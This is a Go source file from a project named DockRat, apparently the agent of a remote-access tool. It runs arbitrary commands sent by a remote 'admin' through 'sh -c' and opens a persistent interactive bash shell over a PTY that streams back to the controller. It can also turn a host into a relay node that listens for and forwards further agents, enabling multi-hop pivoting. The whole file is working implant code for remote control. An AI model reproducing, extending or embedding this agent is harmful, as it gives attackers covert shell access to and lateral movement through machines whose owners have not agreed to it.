package network

import (
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"

	"golang.org/x/term"

	"github.com/Singert/DockRat/core/common"
	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
	"github.com/creack/pty"
)

type ShellSession struct {
	Stdin   io.WriteCloser
	Started bool
}

const BasicAgentID = -100 // 默认Basic模式固定伪ID
var shellSessionMap = make(map[int]*ShellSession)

// ✅ 统一入口：默认 agent 启动模式
func StartBasicAgent(conn net.Conn) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] Agent connection closed: %v", err)
			return
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, nil)
		case protocol.MsgShell:

			handleShellPTY(msg, conn, nil, BasicAgentID)
		case protocol.MsgStartRelay:
			// 🔁 动态转为 relay 模式
			handleStartRelay(msg, conn)
			return // 停止 BasicAgent 循环，由 relay 接管连接
		default:
			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
		}
	}
}

// ✅ relay agent 的消息处理逻辑
func StartRelayAgent(conn net.Conn, ctx *RelayContext) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] RelayAgent connection error: %v", err)
			return
		}
		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, ctx)
		case protocol.MsgShell:
			handleShellPTY(msg, conn, ctx, ctx.SelfID)
		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Println("[-] Decode relay_packet failed:", err)
				continue
			}
			HandleRelayPacket(ctx, pkt)
		case protocol.MsgRelayAck:
			var ack protocol.RelayAckPayload
			_ = json.Unmarshal(msg.Payload, &ack)
			log.Printf("[+] Relay register success: %s", ack.Message)
		case protocol.MsgRelayError:
			var errMsg protocol.RelayAckPayload
			_ = json.Unmarshal(msg.Payload, &errMsg)
			log.Printf("[!] Relay register failed: %s", errMsg.Message)
		default:
			log.Printf("[-] RelayAgent unknown message type: %s", msg.Type)
		}
	}
}

// ✅ 处理 admin 发来的 startrelay 请求，动态切换为 relay 节点
func handleStartRelay(msg protocol.Message, conn net.Conn) {
	var payload protocol.StartRelayPayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] StartRelay payload decode error:", err)
		return
	}

	log.Printf("[*] Received startrelay: listen on %s, ID range [%d ~ %d]",
		payload.ListenAddr, payload.IDStart, payload.IDStart+payload.Count-1)

	ctx := &RelayContext{
		SelfID:      payload.SelfID,
		Registry:    node.NewRegistry(),
		Topology:    node.NewNodeGraph(),
		IDAllocator: common.NewIDAllocator(payload.IDStart, payload.Count),
		Upstream:    conn,
	}

	go StartRelayListener(payload.ListenAddr, ctx)

	ack := protocol.RelayReadyPayload{
		SelfID:     ctx.SelfID,
		ListenAddr: payload.ListenAddr,
	}
	data, _ := json.Marshal(ack)
	resp := protocol.Message{Type: protocol.MsgRelayReady, Payload: data}
	buf, _ := protocol.EncodeMessage(resp)
	conn.Write(buf)

	go StartRelayAgent(conn, ctx) // 用于处理 admin 向 relay 发来的控制命令

	select {}
}

// ✅ 读取一个消息帧
func readMessageFromConn(conn net.Conn) (protocol.Message, error) {
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		return protocol.Message{}, err
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		return protocol.Message{}, err
	}
	return protocol.DecodeMessage(data)
}

// ✅ 命令执行处理
func handleCommand(msg protocol.Message, conn net.Conn, ctx *RelayContext) {
	var payload map[string]string
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Command unmarshal error:", err)
		return
	}
	cmdStr := payload["cmd"]
	log.Println("[+] Received command:", cmdStr)

	output, err := exec.Command("sh", "-c", cmdStr).CombinedOutput()
	if err != nil {
		output = append(output, []byte("\n[!] Command error: "+err.Error())...)
	}

	resp := protocol.Message{Type: protocol.MsgResponse, Payload: output}

	if ctx != nil {
		RelayUpward(ctx, resp)
	} else {
		data, _ := protocol.EncodeMessage(resp)
		conn.Write(data)
	}
}

func handleShellPTY(msg protocol.Message, conn net.Conn, ctx *RelayContext, nodeID int) {
	line := string(msg.Payload)
	log.Printf("[Shell] Received shell input from admin: %q (node %d)", line, nodeID)

	// 获取或初始化会话
	session, exists := shellSessionMap[nodeID]
	if !exists {
		cmd := exec.Command("bash", "--norc", "--noprofile") // ✅ 更真实的交互环境
		cmd.Env = append(os.Environ(), "TERM=xterm")         // ✅ 加强兼容性

		ptmx, err := pty.Start(cmd)
		if err != nil {
			log.Println("[-] Failed to start pty:", err)
			return
		}
		if _, err := term.MakeRaw(int(ptmx.Fd())); err != nil {
			log.Println("[-] Failed to set PTY raw mode:", err)
		}
		session = &ShellSession{
			Stdin:   ptmx,
			Started: true,
		}
		shellSessionMap[nodeID] = session

		// ✅ 启动 goroutine 读取 shell 输出
		go func() {
			buf := make([]byte, 1024)
			for {
				n, err := ptmx.Read(buf)
				if err != nil {
					log.Printf("[-] Shell session for node %d read error: %v", nodeID, err)
					return
				}
				if n == 0 {
					continue
				}
				payload := buf[:n]
				log.Printf("[Shell] Read %d bytes from PTY for node %d: %q", n, nodeID, payload)

				msg := protocol.Message{
					Type:    protocol.MsgShell,
					Payload: payload,
				}

				if ctx != nil && nodeID != ctx.SelfID {
					log.Printf("[Shell] Relaying shell output upward from node %d", nodeID)
					RelayUpward(ctx, msg)
				} else {
					data, _ := protocol.EncodeMessage(msg)
					conn.Write(data)
				}
			}
		}()
	}

	// 写入 shell 命令
	if !strings.HasSuffix(line, "\n") {
		line += "\n"
	}
	_, err := session.Stdin.Write([]byte(line))
	if err != nil {
		log.Printf("[-] Write to shell session %d failed: %v", nodeID, err)
	}
}

func FindNodeIDByConn(reg *node.Registry, conn net.Conn) int {
	for _, n := range reg.List() {
		if n.Conn == conn {
			return n.ID
		}
	}
	return -1
}
func StartBasicAgentWithID(conn net.Conn, ctx *RelayContext, nodeID int) {
	for {
		msg, err := readMessageFromConn(conn)
		if err != nil {
			log.Printf("[-] Agent connection closed: %v", err)
			return
		}

		switch msg.Type {
		case protocol.MsgCommand:
			handleCommand(msg, conn, ctx)
		case protocol.MsgShell:
			handleShellPTY(msg, conn, ctx, nodeID) // ✅ 用 relay 分配的真实 ID
		case protocol.MsgStartRelay:
			handleStartRelay(msg, conn)
			return
		default:
			log.Printf("[-] Unknown or unsupported message: %s", msg.Type)
		}
	}
}
